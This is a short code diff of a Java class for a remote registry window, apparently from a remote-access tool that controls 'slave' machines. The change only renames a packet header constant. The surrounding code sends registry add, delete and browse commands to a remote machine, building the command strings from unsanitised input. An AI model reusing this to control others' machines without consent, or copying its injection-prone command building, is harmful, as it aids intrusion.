@@ -31,8 +31,8 @@ import javax.swing.border.EmptyBorder;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.ui.renderers.JComboBoxIconRenderer;
 import com.redpois0n.utils.IconUtils;
 import com.redpois0n.utils.Util;
@@ -291,7 +291,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 	}
 	
 	public void execute(String location) {
-		slave.addToSendQueue(new PacketBuilder(Header.REGISTRY_BROWSE, new String[] { location }));
+		slave.addToSendQueue(new PacketBuilder(OutgoingHeader.REGISTRY_BROWSE, new String[] { location }));
 	}
 	
 	public void exit() {
@@ -339,7 +339,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		if (data == null) {
 			return;
 		}
-		slave.addToSendQueue(new PacketBuilder(Header.REGISTRY_CUSTOM, new String[] { "REG ADD " + txt.getText() + "\\ /v " + name + " /t " + type + " /d " + data + " /f" }));
+		slave.addToSendQueue(new PacketBuilder(OutgoingHeader.REGISTRY_CUSTOM, new String[] { "REG ADD " + txt.getText() + "\\ /v " + name + " /t " + type + " /d " + data + " /f" }));
 		reload();
 	}
 	
@@ -347,7 +347,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		int row = table.getSelectedRow();			
 		if (row != -1) {
 			String val = table.getValueAt(row, 1).toString();
-			slave.addToSendQueue(new PacketBuilder(Header.REGISTRY_CUSTOM, new String[] { "U REG DELETE " + txt.getText() + "\\" + " /v " + val + " /f" }));
+			slave.addToSendQueue(new PacketBuilder(OutgoingHeader.REGISTRY_CUSTOM, new String[] { "U REG DELETE " + txt.getText() + "\\" + " /v " + val + " /f" }));
 			reload();
 		}
 	}
@@ -362,7 +362,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 				return;
 			}
 			
-			slave.addToSendQueue(new PacketBuilder(Header.REGISTRY_CUSTOM, new String[] { "U REG ADD " + txt.getText() + "\\ /v " + val + " /t " + type + " /d " + data + " /f" }));
+			slave.addToSendQueue(new PacketBuilder(OutgoingHeader.REGISTRY_CUSTOM, new String[] { "U REG ADD " + txt.getText() + "\\ /v " + val + " /t " + type + " /d " + data + " /f" }));
 
 			reload();
 		}
